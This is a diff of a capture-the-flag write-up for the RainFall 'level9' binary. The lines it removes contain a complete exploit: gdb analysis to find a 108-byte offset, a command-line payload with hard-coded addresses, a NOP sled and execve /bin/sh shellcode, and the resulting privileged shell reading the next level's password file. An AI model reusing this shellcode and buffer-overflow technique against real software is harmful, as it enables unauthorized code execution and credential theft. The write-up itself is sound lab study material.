@@ -1,12 +1,3 @@
-_basic binary test_
-```
-level9@RainFall:~$ ./level9 
-level9@RainFall:~$ ./level9 test
-level9@RainFall:~$ ./level9 test test
-```
-
-_using gdb_
-```
 level9@RainFall:~$ gdb ./level9 
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
 Copyright (C) 2012 Free Software Foundation, Inc.
@@ -140,30 +131,3 @@ Non-debugging symbols:
 0x08049bac  completed.6159
 0x08049bb0  dtor_idx.6161
 0x08049bb4  std::__ioinit
-```
-
-_we have a cpp program that use memcopy. we will try to exploit it by switching the buffer by a system call. we need the /bin/sh location, the system() location, the buffer size and the buffer offset._
-
-
-```
-(gdb) b *main+140
-  Breakpoint 1 at 0x8048680
-  (gdb) run $(echo -e "import string\nprint ''.join([char * 4 for char in string.ascii_letters])" | python)
-  
-  Breakpoint 1, 0x08048680 in main ()
-  (gdb) x $eax
-  0x804a078:      0x42424242
-```
-_breakpoint before assignation in eax and fill it with group of ascii letter -> crash at 27 groups, 27 * 4 = 108_
-
-_now we can build the payload_
-```
-level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08'+'\x14\xa0\x04\x08'+'\x90'*55+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x0c\xa0\x04\x08'")
-$ 
-$ id
-uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
-$ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-
-```
-> ** DONE **
